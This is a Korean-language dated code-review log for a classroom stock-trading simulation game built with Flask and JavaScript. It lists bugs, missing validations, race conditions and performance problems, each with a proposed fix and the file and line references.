- **`lottery_draw()` 에서 서버가 당첨 번호 중복을 허용** (`app.py:851-856`): `raw = (request.json or {}).get('numbers', [])`로 받은 번호를 `sorted(set(int(n) for n in raw if 1 <= int(n) <= 45))`로 정제하지만, 진행자가 의도적으로 중복 번호를 제출하면 `set()`으로 중복이 제거된 뒤 `len(nums) != 6` 체크에서 실패해 오류가 반환됨. 문제없으나 `lottery_pick()`(`app.py:830`)도 동일 패턴으로 두 곳의 검증 로직이 복사-붙여넣기 수준으로 동일. 공통 헬퍼 `def _parse_lotto_numbers(raw)` 함수로 추출하면 중복 제거와 유지보수 편의.

---

## 2026-06-15

### 추가하면 좋을 기능

- **[긴급] PostgreSQL URL 자동 수정 누락** (`app.py:13`): Render 무료 티어가 제공하는 `DATABASE_URL` 환경 변수는 `postgres://...` 형식이지만, SQLAlchemy 1.4+는 `postgresql://`만 인식해 `OperationalError: Could not parse rfc1738 URL`로 서버 시작 자체가 실패함. `sqlite:///game.db` 기본값 사용 시에는 숨겨지지만 PostgreSQL로 전환하는 순간 즉시 터짐. `db_url = os.environ.get('DATABASE_URL', 'sqlite:///game.db'); db_url = db_url.replace('postgres://', 'postgresql://', 1); app.config['SQLALCHEMY_DATABASE_URI'] = db_url` 3줄 수정으로 해결.

- **시장 카드에 보유 종목 표시 없음** (`app.js:1147-1165`, `stock_service.py:36-97`): 학생이 이미 보유한 종목이 시장 그리드에서 다른 종목과 동일하게 표시되어 추가 매수 또는 매도 결정을 위해 매번 포트폴리오 탭을 왔다 갔다 해야 함. `loadMarket()` 성공 시 `GET /api/rooms/<rid>/portfolio`의 `holdings` 배열을 심볼 Set으로 변환해 `S.heldSymbols`에 캐싱하고, `renderGrid()` 내 카드 생성 시 `S.heldSymbols.has(st.symbol)`이면 카드 테두리 색상을 `var(--accent)` 또는 좌측에 `<span class="chip chip-blue">보유</span>` 배지를 붙이면 서버 변경 없이 클라이언트만 수정해 즉시 구현 가능.

- **진행자 수업 중 공지 브로드캐스트 기능 없음** (`app.py:470-481`, `index.html:114-145`): 게임 진행 중 교사가 학생 전원에게 "지금 IT 섹터 뉴스를 주목하세요!" 같은 안내를 전달할 방법이 없음. `POST /api/rooms/<rid>/host/announce` 엔드포인트를 추가해 최신 공지를 `StockService` 인스턴스(또는 `Room` 모델의 `announcement` 컬럼)에 저장하고, 참여자 폴링 응답(`get_room()`)에 `announcement` 필드를 포함해 변경 시 폭탄뉴스 팝업과 동일한 UI로 표시하면 수업 소통 도구로 즉시 활용 가능.

- **관심종목(watchlist)이 방 ID와 무관하게 전역 저장** (`app.js:17`): `localStorage.getItem('watchlist')`로 저장하므로, 같은 브라우저에서 다른 수업(다른 방)에 참여하면 이전 수업의 관심종목이 그대로 남아 있음. `localStorage.getItem(\`watchlist-${S.room?.id || 'default'}\`)` 형태로 방 ID를 키에 포함시키면 방별로 독립된 관심종목 유지 가능. `app.js:17`, `app.js:1137`, `app.js:1138` 세 줄 수정으로 해결.

- **게임 도중 참여자 실시간 접속 상태 표시 없음** (`app.py:421-425`, `index.html:146-155`): 진행자 순위 화면에서 어떤 학생이 지금 앱을 열고 있는지 알 수 없음. `RoomMember`에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고 `get_rankings()` 또는 `get_portfolio()` 호출 시 갱신. 진행자 순위 목록에서 `last_seen`이 3분 이내이면 🟢, 이상이면 ⚫를 표시하면 교사가 이탈 학생을 즉시 파악 가능 (`app.py:330` `result.append()` 시 `last_seen` 포함, `app.js:385` 렌더링에 아이콘 추가).

- **참여자 이탈 후 재진입 시 방 코드 재입력 필요** (`app.js:2106-2127`, `app.py:214-223`): 학생이 실수로 브라우저를 새로고침하거나 뒤로가기를 누르면 로딩 화면으로 돌아가 방 코드·학번·이름을 다시 입력해야 함. `enterParticipantGame()` 시작 시 `sessionStorage.setItem('lastRoom', S.room.id)`로 방 ID를 저장하고, `window.onload`(`app.js:2106`) 초기화 시 `sessionStorage`의 방 ID가 있으면 `GET /api/auth/me` → `active_room`으로 자동 복원하면 새로고침 후에도 게임 화면이 유지됨. (`sessionStorage`는 탭 닫기 시 자동 삭제되므로 `localStorage`보다 안전.)

---

### 제거/단순화할 것들

- **`StockService._init_prices()` TTL 즉시 만료 초기화** (`stock_service.py:120-122`): `self._prices[sym] = (now - self._price_ttl, start)` 패턴으로 모든 종목의 타임스탬프를 이미 만료된 상태로 초기화함. 학생 30명이 게임 시작 후 동시에 시장 탭을 로드하면 첫 번째 `get_price()` 호출에서 전체 45개 종목 가격이 일제히 재계산되는 thundering herd가 발생. `(now, start)`로 교체하면 초기 가격이 `price_ttl`(기본 20초) 동안 안정적으로 유지되고 첫 로드 시 부하가 분산됨.

- **`_lot_round_due()` 일시정지 상태에서 복권 알림 오작동** (`app.py:76-85`): 함수 시작 시 `if room.status != 'active': return None` 체크가 있지만 (`app.py:77`), 일시정지 상태는 `room.status == 'paused'`이므로 `!= 'active'`에 해당해 `None`을 반환함 — 이 부분은 올바름. 그러나 `room_dict()` 내 `lottery_round_due` 계산(`app.py:168`)에서 `_lot_round_due(room, remaining, total_s)`가 호출될 때, 일시정지 중 `remaining`은 `(end_time - paused_at)`로 계산되어 경과 비율이 고정됨. 따라서 복권 알림이 `picking` 상태로 진입하지 않아도 진행자 화면에 "복권 추첨 시간" 알림바가 남아 있는 것처럼 보일 수 있음. `_lot_round_due()` 내 `room.status` 체크를 `if room.status not in ('active',): return None`으로 명시적으로 제한해 의도를 분명히 할 것.

- **`app.js:17` `S` 객체 초기화에 `watchlist` 로드가 인라인으로 포함** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))` 파싱이 `S` 객체 리터럴 내부에 있어, `localStorage`에 손상된 JSON이 있으면 `JSON.parse` 예외가 발생해 `S` 전체 초기화가 실패하고 이후 모든 전역 상태가 `undefined`가 됨. `let watchlistRaw = []; try { watchlistRaw = JSON.parse(localStorage.getItem('watchlist') || '[]'); } catch(e) {}` 방어 코드를 `S` 선언 직전에 추가하고 `S.watchlist = new Set(watchlistRaw)`로 분리하면 손상된 캐시로 인한 전체 앱 오류를 방지.

- **`app.py:637-655` 예금 이자 계산에 UTC vs 로컬 시간 불일치** (`app.py:639`, `app.py:642`): `get_deposits()`에서 `now = datetime.utcnow()`로 현재 시간을 계산하고 `held = (now - d.created_at).total_seconds()`로 보유 시간을 구함. `d.created_at`은 `datetime.utcnow()` 기본값(`models.py:88`)이므로 일관성은 있지만, `create_deposit()` 응답(`app.py:676`)에서는 `remaining = (room.end_time - datetime.utcnow()).total_seconds()`로 예상 이자를 계산함. 예금 직후 이 두 값이 동일한 방향으로 계산되지만, `room.end_time`이 일시정지로 인해 연장된 경우(`resume_room()`: `app.py:304`) `get_deposits()`의 `total_seconds`는 `room.duration_minutes * 60`으로 고정되어 실제 연장된 게임 시간이 반영되지 않음. `total_seconds = max(room.duration_minutes * 60, (room.end_time - room.start_time).total_seconds())` 처럼 실제 게임 총 시간으로 계산하면 정확성 향상.

- **`app.py:146-170` `room_dict()` 매 호출 시 `RoomMember.query.filter_by().count()` 실행** (`app.py:165`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 호출마다 COUNT 쿼리를 실행함. `get_room()`, `create_room()`, `join_room()`, `start_room()`, `end_room()` 등 방 상태를 반환하는 모든 엔드포인트가 이를 호출해 사용자 수만큼 COUNT 쿼리가 중복 발생. `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼을 추가하고 `join_room()` / `kick_member()` 시 `+1/-1` 증감 업데이트하거나, SQLAlchemy `lazy='dynamic'` + `count()` 대신 relationship backref로 미리 로드하면 쿼리 1회 절약.

- **`submit_quiz()` `room.status` 미확인으로 게임 종료 후 현금 변경 가능** (`app.py:917-947`): `get_quiz()`는 `room.status != 'active'` 체크가 있어 (`app.py:905`) 종료 후 퀴즈 질문을 받을 수 없지만, `submit_quiz()`는 해당 체크가 없음. 학생이 퀴즈를 열어 둔 채 게임이 종료되면 `_quiz_state`의 `qid`가 남아 있어 게임 종료 후에도 답안을 제출해 `RoomMember.cash`가 변경될 수 있음 (종료 직후 포트폴리오 결산 전 또는 후에 따라 Excel 결과가 달라질 수 있음). `app.py:921` 직후에 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 체크를 추가하면 즉시 방지.

---

## 2026-06-16

### 오늘 수정된 버그 (참고)

- **복권 입력 창 미표시** (`app.js:586-598`): 복권 시작 시 게임이 자동 일시정지(`room.status = 'paused'`)되는데, `lottery_active` 체크가 `else` 블록(게임 활성 시에만 실행) 안에 있어 참여자 화면에서 복권 폴링이 시작되지 않았음. `lottery_active` 체크를 `if(paused)/else` 분기 바깥으로 이동해 해결.

- **복권 결과 창 반복 표시 / 룰렛 미표시** (`app.js:1816-1821`, `app.js:586`): 결과 창을 닫으면 `_lotResultShown = false`로 리셋되어 방 폴링이 복권 폴링을 즉시 재시작 → 결과 창이 무한 반복 표시. 이 루프가 화면을 점유해 룰렛도 표시 불가. `_lotResultShown` 대신 `_lotResultRound`(회차 번호)를 추적하고 같은 회차이면 재시작하지 않도록 수정, 서버에 `lottery_current_round` 필드 추가.

---

### 추가하면 좋을 기능

- **복권 번호 선택 중 오버레이 강제 닫기 가능** (`app.js:2102-2106`, `index.html:495`): 참여자가 번호 선택 중 `closeLotteryOverlay()`를 호출(닫기 버튼 또는 브라우저 뒤로가기)하면 `_stopLotPolling()`이 실행되어 이후 결과를 영원히 볼 수 없음. `_lotResultRound`로 결과 재표시는 차단되고, 복권 폴링도 멈춘 상태라 당첨 여부를 확인할 방법이 없어짐. 'picking' · 'drawing' 상태일 때는 닫기 버튼을 `display:none`으로 숨기고 `closeLotteryOverlay()`에 `if (d.state === 'picking' || d.state === 'drawing') return;` 가드를 추가하면 실수 닫기 방지.

- **복권 상금 출처 미처리** (`app.py:789-794`, `app.py:99-105`): `lottery_start()`에서 `prize`를 받아 `_lots[rid]['current']['prize']`에 저장하지만 진행자 또는 방 공동 자금에서 차감하지 않음. `_do_reveal()`에서 당첨자에게 현금이 지급되므로 상금 총액만큼 시스템 외부에서 돈이 생성됨. 수업용으로는 큰 문제가 없으나, `RoomMember` 전체 `cash` 합계가 게임 시작 시보다 늘어나 정확한 수익률 분석을 방해함. 진행자의 `RoomMember.cash`에서 `prize`를 차감하거나, `Room`에 `prize_pool` 컬럼을 두어 별도 관리 권장.

- **복권 참여자 미제출 시 피드백 없음** (`app.py:87-105`, `app.js:2033-2041`): 번호를 제출하지 않은 참여자가 `drawing` 상태에서 대기 화면으로 전환되면 `lottery-my-submitted` 요소에 아무것도 표시되지 않음 (`_lotParticipantPicks.length > 0` 조건 실패). 미제출 참여자에게 "번호를 제출하지 않았습니다" 문구를 명시적으로 보여주면 혼란 방지. `app.js:2038` 조건을 `else` 분기로 확장하면 됨.

- **복권 회차 번호 자동 지정 없음** (`app.py:779`, `app.js:1895`): `lottery_start()`의 `round_n = int(d.get('round', 1))`은 클라이언트가 보낸 값을 그대로 신뢰. 진행자가 1회차를 건너뛰고 2회차부터 시작하거나 같은 회차를 두 번 시작해도 서버에서 검증하지 않음 (`_lots[rid]['done']` Set에 없으면 통과). 서버 측에서 `done` Set의 최대값 + 1을 자동으로 `round_n`으로 계산하고 클라이언트 입력을 무시하면 회차 조작 방지.

- **룰렛 미니게임 시간 만료 후 스핀 버튼 잠금 없음** (`app.py:729-735`, `app.js:919-936`): `minigame_spin()`은 서버에서 `remaining > total_s * 0.05`이면 400 오류를 반환하지만, 룰렛 오버레이는 한 번 열리면 게임 종료 후에도 열려 있을 수 있음. 게임 종료 시 `stopPolling()` 후 `showScreen('screen-results')`로 이동하는데, 룰렛 오버레이가 `position:fixed`로 위에 떠 있으면 결과 화면 뒤에서 클릭을 가로막음. `stopPolling()` 호출 시 `document.getElementById('roulette-overlay').style.display = 'none'`을 함께 실행하면 안전.

---

### 제거/단순화할 것들

- **`closeLotteryResultModal()` 불필요한 래퍼 함수** (`app.js:2108-2110`): `closeLotteryResultModal()`이 `closeModal('modal-lottery-result')` 한 줄만 호출. 기존에는 `_lotResultShown = false` 리셋 로직이 있었으나 오늘 수정으로 제거됨. HTML(`index.html:733`)에서 `onclick="closeModal('modal-lottery-start')"` 패턴과 동일하게 `onclick="closeModal('modal-lottery-result')"` 직접 호출로 단순화하고 래퍼 삭제 가능.

- **`lottery-notify-bar` 인라인 스타일에 `display:none` 중복** (`index.html:133`): `style="display:none;background:...;display:none;align-items:center;..."` 에서 `display:none`이 두 번 선언됨. CSS 파서가 마지막 선언을 사용하므로 결과적으로는 정상 동작하지만, `showLotteryNotifyBar()`에서 `bar.style.display = 'flex'`로 바꿀 때 두 번째 `display:none`이 이미 인라인 파싱 시 덮어쓰여 있어 혼동 유발. 첫 번째 `display:none` 하나만 남기고 삭제.

- **`_checkLotteryStatus`에서 `_stopLotPolling()` 후 즉시 `_showLotteryResult` 호출** (`app.js:1853-1855`): 'revealed' 상태 감지 시 폴링을 멈추고 결과를 표시하는 흐름은 올바르나, `_stopLotPolling()`이 `_lotCountdownTimer`도 함께 초기화(`clearInterval`)하므로 이후 `_showLotteryResult` 내 `clearInterval(_lotCountdownTimer)` 호출(`app.js:2045`)이 중복 실행됨. 큰 문제는 없으나 `_showLotteryResult` 내 `clearInterval` 제거로 단순화 가능.

- **`_startLotPolling()`에서 즉시 호출과 인터벌 중복** (`app.js:1822-1826`): `_checkLotteryStatus(rid)`를 즉시 한 번 호출한 뒤 3초 인터벌을 시작함. 즉시 호출이 완료되기 전에 인터벌 첫 번째 실행이 3초 후 따라오므로 서버 응답 지연 시 두 요청이 겹칠 가능성이 있음. `_lotPollInterval`을 1초 딜레이 후 시작하거나 즉시 호출을 `await`로 기다린 뒤 인터벌 등록 (`_checkLotteryStatus(rid).then(() => { _lotPollInterval = setInterval(...) })`)하면 중복 방지.

- **`_lots` 딕셔너리에서 완료된 복권 데이터 영구 보존** (`app.py:71`, `app.py:109`): `_do_reveal()` 호출 시 `cur['state'] = 'revealed'`로만 변경하고 `_lots[rid]['current']`를 `None`으로 초기화하지 않음. 게임 종료 후에도 메모리에 남아 `lottery_active`가 'revealed' 상태를 반환 계속. `cleanup_room_service()`(`app.py:64-68`) 호출 시 `_lots.pop(rid, None)`을 함께 실행하면 게임 종료 시 복권 데이터가 메모리에서 정리됨.

---

## 2026-06-16 (2차)

### 추가하면 좋을 기능

- **주식 거래 수수료 설정 기능** (`app.py:252-258`, `models.py:25-38`): 방 생성 시 매수/매도 수수료율(0~1%)을 설정하면 "수수료가 투자 수익에 미치는 영향" 개념을 체험 가능. `Room`에 `trade_fee_pct = db.Column(db.Float, default=0.0)` 컬럼 추가 → `trade()` 내 `app.py:539~543`에서 매수 시 `amount *= (1 + room.trade_fee_pct / 100)`, 매도 시 `amount *= (1 - room.trade_fee_pct / 100)` 적용 → `RoomTransaction.note`에 수수료 금액 기록. 방 생성 폼(`index.html:62-75`)과 `doCreateRoom()`(`app.js:124`)에 입력란 1개 추가로 50줄 내 완성.

- **시나리오 예약 이벤트 (교사 사전 설정)** (`app.py:1017-1032`): 교사가 게임 시작 전 특정 경과 시점(예: "전체 시간의 40% 경과 시 배터리 섹터 -20%")에 자동 발동할 이벤트를 등록하는 `POST /api/rooms/<rid>/host/schedule-event` 엔드포인트 추가. `_scheduled_events: dict[int, list]` 인메모리 구조로 저장하고, `room_dict()`(`app.py:159`) 내 경과 비율 계산 시 해당 이벤트를 트리거. 교사가 수업 흐름에 맞춰 주가 충격을 미리 계획해 수업 진행이 매끄러워지며, `force_sector_event()` 기존 로직을 재사용하므로 추가 구현량이 적음.

- **결과 화면에 개인 거래내역 조회** (`index.html:587-625`, `app.js:1568-1649`): 게임 종료 후 `screen-results`에서 자신의 매수/매도 기록을 볼 방법이 없음. `loadResults()` 내 `app.js:1568` 직후에 `GET /api/rooms/<rid>/transactions?page=1` 결과를 "내 거래 내역 펼치기" 토글 섹션으로 추가하면, 게임 사후 "왜 이 종목을 선택했나요?" 토론에서 학생이 자신의 타이밍·종목을 데이터와 함께 발표 가능. 서버 변경 없이 클라이언트만 수정.

- **Excel 내보내기에 전체 학생 거래내역 시트 추가** (`app.py:1078-1147`): 현재 엑셀은 최종 순위 시트 1개만 생성. `app.py:1140` 직후에 `ws2 = wb.create_sheet('거래내역')`를 만들고 `RoomTransaction.query.filter_by(room_id=rid).order_by(RoomTransaction.user_id, RoomTransaction.timestamp).all()` 결과를 [학번, 이름, 종목, 매수/매도, 수량, 단가, 금액, 시각] 컬럼으로 기록하면 교사가 사후 학생별 투자 패턴을 분석 가능. 약 30줄 추가로 구현 완료.

- **포트폴리오 전량 청산 원클릭 버튼** (`index.html:378-395`, `app.js:1324-1435`): 게임 종료 직전 보유 종목을 하나씩 매도해야 해서 현금화가 번거로움. 포트폴리오 탭 상단 "보유 종목" 제목 옆에 "전체 매도" 버튼을 추가하고, `for...of` + `await execTrade('SELL', h.symbol, h.shares)` 루프로 순차 처리하면 됨. 실패한 종목은 toast로 알리고 나머지는 계속 진행하는 방식으로 partial 케이스 처리.

- **진행자 화면에서 폭탄뉴스 팝업 비표시** (`app.js:725-737`, `app.js:1029-1056`): `startNewsPolling()`은 진행자·참여자 구분 없이 동일하게 `showBombNews()`를 호출해 진행자도 팝업을 받음. 진행자는 자신이 뉴스를 발송하는 주체이므로 팝업이 불필요하고 대시보드 시야를 가림. `startNewsPolling()` 내 `app.js:734`에 `if (S.room?.is_host) return;` 조건 한 줄만 추가하면 진행자에게만 팝업을 숨길 수 있음.

---

### 제거/단순화할 것들

- **[중요 버그] `export_rankings()` 게임 종료 후 새 StockService 가격으로 자산 계산** (`app.py:1078`, `app.py:35-46`, `stock_service.py:304-312`): `_end_room()`이 `cleanup_room_service(room.id)`를 호출해 서비스를 삭제(`app.py:68`)하면, 이후 교사가 엑셀 다운로드 시 `member_total_value()` 내 `get_room_service(rid)`(`stock_service.py:308-311`)가 새 인스턴스를 생성해 완전히 다른 무작위 가격으로 보유 주식 평가액을 계산함. 결과 화면에 표시된 순위와 Excel 순위가 다를 수 있음. 해결책: `_end_room()` 내 `cleanup_room_service()` 호출 직전에 `for h in RoomHolding.query.filter_by(room_id=room.id): m = RoomMember.query.filter_by(room_id=room.id, user_id=h.user_id).first(); price = svc.get_price(h.symbol) or h.avg_price; m.cash += price * h.shares; db.session.delete(h)` 루프로 주식을 현재가에 일괄 청산하면 StockService 없이도 정확한 최종 자산 산출 가능.

- **참여자 1명당 분당 최대 36회 폴링 요청 폭주** (`app.js:577-604`, `app.js:725-737`, `app.js:676-694`): 참여자 게임 화면에서 `S.pollInterval` (5초, `GET /rooms/<rid>`) + `S.newsInterval` (3초, `GET /rooms/<rid>/news`) + `refreshMyRank()` (5초마다, `GET /rooms/<rid>/rankings`) 세 가지 폴링이 독립 실행돼 학생 1명당 분당 최대 36회 요청 발생. 참여자 30명이면 분당 1,080회로 Render 무료 티어에 과부하. `GET /rooms/<rid>` 응답에 `{ status, remaining_seconds, news: {...}, my_rank, my_total_value, lottery_active }` 필드를 통합 포함해 3개 폴링을 1개로 줄이면 분당 360회 (3× 감소). 서버 `get_room()` 라우트 1곳 수정 + 클라이언트 폴링 통합으로 완결.

- **`startTimer()` 클라이언트 로컬 시간 기반으로 타이머 오차 발생 가능** (`app.js:697-717`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` 계산이 학생 기기의 로컬 시계에 의존. 기기 시계가 서버와 3분 차이 나면 타이머가 실제보다 3분 일찍/늦게 "00:00"이 되어 혼란 유발(실제 게임 종료는 서버 기준으로 정상 처리됨). `S.room.remaining_seconds`(서버가 계산한 값)를 기준으로 매 초 -1 카운트다운하고, `pollInterval` 응답으로 `remaining_seconds`를 교정하는 방식으로 전환하면 시계 오차와 무관하게 정확한 타이머 표시 가능 (`app.js:710`의 `new Date()` 계산 제거).

- **`api.del()` HTTP 오류 응답 미처리** (`app.js:34`): 2026-06-14에 `api.get()`·`api.post()`의 동일 문제를 지적했으나 `api.del()`은 언급되지 않음. `(await fetch(url, {method:'DELETE'})).json()` 그대로 반환해 서버 500 시 `SyntaxError`로 UI 조용히 중단. `doWithdraw()`(`app.js:1530`)·`doKickMember()`(`app.js:208`)가 이를 사용. `api.get`/`api.post` 수정 패치 시 `api.del`도 동일하게 `const r = await fetch(url, {method:'DELETE'}); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 함께 수정하면 세 함수를 일관성 있게 보호 가능.

- **`openStockModal()` 매번 포트폴리오 API 호출** (`app.js:1212-1224`): 학생이 종목 카드를 탭할 때마다 `GET /api/rooms/<rid>/portfolio`를 실행해 현금 잔액과 보유 수량을 가져옴. 종목 모달을 빠르게 여닫으며 여러 종목을 비교하는 경우 매 탭마다 API 요청이 발생. `S` 상태에 `portfolioCache: {cash, holdingsMap, updatedAt}` 필드를 추가하고 10초 이내면 캐시를 재사용하면 요청 수를 크게 줄일 수 있음. `execTrade()` 성공 시(`app.js:1292-1322`) 캐시의 `cash`와 `holdingsMap`을 로컬 갱신하면 API 없이도 모달 내 현금·보유 수량이 즉시 반영됨.

- **`S.assetHistory`·`S.stocks` 방 전환 시 미초기화** (`app.js:19`, `app.js:691-694`, `app.js:1097-1109`): `goHome()`(`app.js:96`)·`doLogout()`(`app.js:89`)이 `S.user = null; S.room = null`만 리셋하고, `S.assetHistory`, `S.stocks`, `S.sectors`, `S.newsTs` 등 게임 중 누적 데이터는 초기화하지 않음. 같은 세션에서 다른 방에 재입장하면 이전 게임 자산 히스토리가 포트폴리오 탭 차트에 혼합 표시되고, 이전 방 종목 가격 대비 플래시 애니메이션(`app.js:1181-1191`)이 틀리게 발동됨. `showLanding()` 내(`app.js:82-85`) 또는 `stopPolling()` 내에 `S.assetHistory = []; S.stocks = []; S.sectors = []; S.newsTs = 0;` 4줄 추가로 해결.

---

## 2026-06-16 (3차)

### 추가하면 좋을 기능

- **`submit_quiz()` 게임 종료 후 현금 변경 방지** (`app.py:986-1014`): `get_quiz()`는 `room.status != 'active'` 체크가 있으나 `submit_quiz()`에는 없음. 학생이 퀴즈를 열어 두고 게임이 종료된 후 제출하면 `RoomMember.cash`가 변경돼 결과 화면의 자산과 엑셀 파일 수치가 달라질 수 있음. `app.py:987` 직후 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 한 줄 추가로 즉시 방지 가능.

- **`minigame_open()` 경쟁 조건으로 이중 일시정지 위험** (`app.py:738-745`): `state['count'] += 1` 직후 `if state['count'] == 1` 체크까지 Lock이 없음. Gunicorn 멀티 워커 또는 eventlet 환경에서 두 학생이 동시에 룰렛을 열면 두 요청 모두 `count == 1`로 평가해 `room.status = 'paused'`와 `room.paused_at` 설정이 중복 실행. 두 번째 `paused_at` 덮어쓰기로 `resume_room()`의 연장 시간이 틀어짐. `_room_services_lock` 과 같은 방식으로 `_rlt_active_lock = Lock()`을 추가하고 open/close 핸들러에서 count·auto_paused 변경을 원자적으로 실행 권장.

- **`force_sector_event()` 구(舊) 타임스탬프 재사용으로 이벤트 효과 즉시 소멸** (`stock_service.py:244`): `self._prices[sym] = (ts, new_price)`에서 기존 `ts`를 재사용. TTL이 이미 만료된 종목은 다음 `get_price()` 호출에서 즉시 새 무작위 가격으로 덮어씌어짐. `(ts, new_price)` → `(time.time(), new_price)`로 교체하면 최소 `_price_ttl`(기본 20초)동안 강제 이벤트 가격이 유지됨. `force_price()`의 동일 버그(`stock_service.py:216`)도 함께 수정 필요.

- **`_next_price()` 클램프 범위와 `force_price()` 허용 범위 불일치** (`stock_service.py:137`, `stock_service.py:215`): `force_price()`는 base×3.0까지 허용하지만 `_next_price()`는 base×1.4로 클램핑. 교사가 강제로 올린 가격이 한 틱(20초) 만에 base×1.4로 원상 복귀돼 수업 시연 효과가 사라짐. `stock_service.py:137`의 `min(base * 1.4, new_price)` → `min(base * 3.0, new_price)` 또는 force_price 후 `_current_biases[symbol] = direction`을 삽입해 모멘텀 유지 권장.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1081-1083`): `import openpyxl`, `from io import BytesIO`, `from openpyxl.styles import ...` 3줄이 라우트 함수 내부에 위치. `openpyxl` 미설치 환경에서 서버가 정상 시작됐다가 교사가 엑셀 내보내기를 누를 때만 `ImportError: 500`이 반환됨. 모듈 상단으로 이동하면 서버 시작 시 즉시 오류 감지 가능하고, 코드 파악도 쉬워짐.

- **`get_deposits()` 예금 이자 계산 시 일시정지 연장 게임 시간 미반영** (`app.py:652-658`): `total_seconds = room.duration_minutes * 60`으로 고정 계산하므로 진행자가 게임을 여러 번 일시정지해 전체 시간이 늘어났을 경우 이자 비율이 과다 계산됨. `total_seconds = max(room.duration_minutes * 60, (room.end_time - room.start_time).total_seconds()) if room.start_time and room.end_time else room.duration_minutes * 60` 처럼 실제 게임 총 시간을 기준으로 계산하면 정확도 향상.

- **`StockService._init_prices()` 전 종목 TTL 즉시 만료 초기화** (`stock_service.py:124`): `self._prices[sym] = (now - self._price_ttl, start)` 패턴으로 모든 종목 타임스탬프를 이미 만료된 상태로 설정. 학생 30명이 게임 시작 후 동시에 시장 탭을 로드하면 첫 번째 `get_price()` 호출에서 45개 종목 가격이 일제히 재계산되는 thundering herd 발생. `(now, start)`로 교체하면 초기 20초 동안 가격이 안정적으로 유지되고 첫 로드 시 서버 부하가 분산됨.

---

### 제거/단순화할 것들

- **`host_adjust()` `user_id` 누락 시 의미없는 DB 쿼리 실행** (`app.py:388-392`): `target_uid = d.get('user_id')`가 None이면 `RoomMember.query.filter_by(room_id=rid, user_id=None).first()`로 `WHERE user_id IS NULL` 쿼리가 실행됨. 결과는 None → 404로 처리되지만 불필요한 DB 쿼리 발생. `app.py:388` 직후 `if not target_uid: return jsonify({'error': 'user_id 필요'}), 400` 조기 반환으로 불필요한 쿼리와 모호한 오류 메시지를 동시에 제거 가능.

- **`api.get/post/del` 모두 HTTP 오류 응답 미처리** (`app.js:30-34`): `api.get()`, `api.post()`, `api.del()` 모두 `fetch(...).json()`을 바로 호출해 서버가 500 에러로 HTML 오류 페이지를 반환하거나 네트워크 오류가 발생하면 `.json()` 파싱 실패로 처리되지 않는 `SyntaxError`가 발생해 UI가 조용히 멈춤. `const r = await fetch(url, opts); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 세 함수를 일관성 있게 수정하면 안정성이 대폭 향상됨.

- **`loadParticipantRankings()` 매 호출 시 스피너로 목록 초기화** (`app.js:676-694` 참조, 순위 렌더링 로직): 5초 폴링마다 `list.innerHTML = '<div class="loading-center"><span class="spinner"></span></div>'`로 기존 내용을 스피너로 덮어씌워 순위 목록이 깜빡임. `loadHostMembers()`처럼 데이터를 먼저 받아온 뒤 `innerHTML`을 교체하거나, `if (!list.children.length)` 조건으로 초기 로딩 시에만 스피너를 표시하면 깜빡임 없이 부드러운 업데이트 가능.

- **`room_dict()` 매 호출 시 `RoomMember.query.filter_by().count()` 실행** (`app.py:178`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 호출마다 COUNT 쿼리를 실행. `get_room()`, `create_room()`, `join_room()`, `start_room()` 등 방 상태를 반환하는 모든 엔드포인트가 이를 호출해 불필요한 COUNT 쿼리가 반복. `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼 추가 후 `join_room()`·`kick_member()` 시 증감 업데이트하면 쿼리 1회 절약.

- **`goHome()` / `doLogout()` 에서 게임 중 누적 상태 미초기화** (`app.js:89-100`): `S.user = null; S.room = null`만 리셋하고 `S.assetHistory`, `S.stocks`, `S.sectors`, `S.newsTs` 등 게임 중 누적 데이터는 초기화하지 않음. 같은 세션에서 다른 방에 재입장하면 이전 게임 자산 히스토리가 포트폴리오 탭 차트에 혼합 표시되고, 이전 방 종목 가격 대비 플래시 애니메이션이 틀리게 발동됨. `showLanding()` 내 (`app.js:82`) `S.assetHistory = []; S.stocks = []; S.sectors = []; S.newsTs = 0;` 4줄 추가로 해결 가능.

- **`S.watchlist` 초기화 시 손상된 JSON으로 앱 전체 실패 가능** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))`가 `S` 객체 리터럴 내부에 있어 `localStorage`에 손상된 JSON이 있으면 `JSON.parse` 예외가 발생해 `S` 전체 초기화 실패 → 이후 모든 전역 상태가 `undefined`. `let watchlistRaw = []; try { watchlistRaw = JSON.parse(localStorage.getItem('watchlist') || '[]'); } catch(e) {}` 방어 코드를 `S` 선언 직전에 추가하고 `S.watchlist = new Set(watchlistRaw)`로 분리하면 손상된 캐시로 인한 전체 앱 오류 방지.

- **`RLT_SEGS` 상수 완전한 dead code** (`app.js:820-826`): `const RLT_SEGS = [{label:'꽝',...}, ...]` 7줄이 선언되어 있지만 `openRouletteModal()`, `doRouletteSpin()`, `updateRltLegend()`, `updateRltWheel()` 어디서도 이 변수를 참조하지 않음. 스핀 결과는 서버 응답의 `data.seg_start/data.seg_end`를 직접 사용하고, 범례는 `data.multipliers/data.weights`를 사용. 완전히 삭제 가능.

---

## 2026-06-15 (2차)

### 추가하면 좋을 기능

- **게임 룰 설명 창 교사 커스터마이징 불가** (`index.html:803-931`, `models.py:25-38`): 이번 커밋(275615e)으로 추가된 게임 룰 창은 108줄의 HTML이 `index.html`에 하드코딩되어 교사가 수업 맞춤 룰(예: "1인당 종목 최대 3개", "데이 트레이딩 금지")을 추가할 방법이 없음. `Room` 모델에 `custom_note = db.Column(db.Text, nullable=True)` 컬럼을 추가하고 방 생성 시 선택 입력란을 두면, `room_dict()`를 통해 참여자에게 전달되어 룰 창 하단 "선생님 공지" 섹션에 표시 가능. `openRules()`에서 `S.room.custom_note`가 있으면 해당 요소를 보이게 하는 3줄 추가로 구현 완료.

